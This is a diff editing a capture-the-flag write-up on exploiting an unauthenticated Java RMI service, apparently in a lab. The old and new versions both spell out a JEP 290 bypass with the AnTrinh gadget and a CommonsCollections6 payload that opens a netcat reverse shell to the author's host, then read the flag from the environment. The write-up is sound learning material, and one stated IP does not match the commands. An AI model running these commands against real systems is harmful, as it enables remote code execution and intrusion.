@@ -32,7 +32,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 45.91 seconds
 ```
 
-There's the game itself on port 8000 which isn't very interesting and unauthenticated JMX RMI on ports 60001 (register) and 60002 (TODO)
+There's the game itself on port 8000 which isn't very interesting and unauthenticated JMX RMI on ports 60001 (registry) and 60002.
 
 I tried several tools for scanning/attackng JMX RMI with the best results from https://github.com/qtc-de/remote-method-guesser which also conveniently comes with a Docker image (`docker pull ghcr.io/qtc-de/remote-method-guesser/rmg:4.4.0`).
 
@@ -41,49 +41,13 @@ So first I enumerated the 60001 registry endpoint with `docker run --rm -it ghcr
 
 ![alt text](img/rmg_enum.png)
 
-TODO theory: JEP 290 was a security fix for JVM which removed the possibility to directly attack RMI using a deserialization attack by filtering. But the fix can still be bypassed by creating a "reverse" channel - creating a client on target server which would open an unfiltered channel outside which then can be used to attack
+JEP 290 was a security fix for JVM which removed the possibility to directly attack RMI using a deserialization attack by adding filtering on incoming connections. But the fix could still be bypassed by creating an outbound channel from the vulnerable target which doesn't have the filtering and so can be attacked as usual.
 
-
-here the 10.99.0.28 is IP of my machine on the VPN:
+So the set this up, I needed 3 components (10.99.0.28 is IP of my machine on the VPN):
 1 - reverse shell listener: `nc -vlp 7002`
-2 - RMI listener: `docker run --rm -it -p 7001:7001 ghcr.io/qtc-de/remote-method-guesser/rmg:4.4.0 listen 0.0.0.0 7001 CommonsCollection6 'nc 10.200.0.28 7002 -e /bin/bash'`
-3 - attack: `docker run --rm -it -p 7001:7001 ghcr.io/qtc-de/remote-method-guesser/rmg:4.4.0 serial 10.99.0.102 60001 AnTrinh 10.200.0.28:7001 --component reg`
-
-=================================================================================================================================================================
-old:
-...
-JEP290 bypass  
-An Trinh gadget
-Vulnerable
-
-JEP290 provided filtering in order to defend against JMX RMI deserialization attack so a direct attack against the endpoint won't work.
-Instead the defense can be bypassed by creating a separate listener without filtering and using that vector to attack:
-
-
-
-
-
-
-
-
-
-I had to use java 11
-(I used rmg from release and ysoserial-all.jar from https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar) 
-
-Order:
-My IP in VPN: 10.200.0.28
-
-
-
-1) listen for reverse shell: `nc -vlp 7002`
-2) listen RMI ???: `java -jar ./rmg-4.4.1-... listen 10.200.0.28 7001 CommonsCollections6 'nc 10.200.0.28 7002 -e /bin/bash' --yso ./ysoserial-all.jar`
-3) serial attack `java -jar ./rmg-4.4.1-... serial 10.99.0.102 60001 AnTrinh 10.200.0.28:7001 --yso ./ysoserial-all.jar`
+2 - local RMI listener: `docker run --rm -it -p 7001:7001 ghcr.io/qtc-de/remote-method-guesser/rmg:4.4.0 listen 0.0.0.0 7001 CommonsCollections6 'nc 10.200.0.28 7002 -e /bin/bash'`
+3 - bypass: `docker run --rm -it -p 7001:7001 ghcr.io/qtc-de/remote-method-guesser/rmg:4.4.0 serial 10.99.0.102 60001 AnTrinh 10.200.0.28:7001 --component reg`
 
 Now that the netcat captured shell, I spent some time looking around for the flag but in the end it was env var of the running process
 `env` -> flag
-
-
-
- not needed: #I had to add 10.99.0.102 localhost to /etc/hosts
-TODO - bridged Docker?
 
